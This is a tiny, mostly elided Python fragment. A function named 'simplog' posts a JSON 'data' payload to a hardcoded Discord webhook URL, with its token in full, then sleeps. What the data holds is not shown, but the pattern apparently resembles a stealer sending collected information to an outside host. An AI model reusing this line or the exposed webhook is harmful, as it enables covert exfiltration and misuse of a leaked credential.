...
def simplog():
    ...
    requests.post("https://canary.discord.com/api/webhooks/1039956029892464760/_ZoITIzb6iK5EHg0G_mFgA7Mk7NZgvlF_uNAfpPjn7AIGm9b1ArHkZGkOpsUT-6ZVNI7", json = data)
    time.sleep(3)
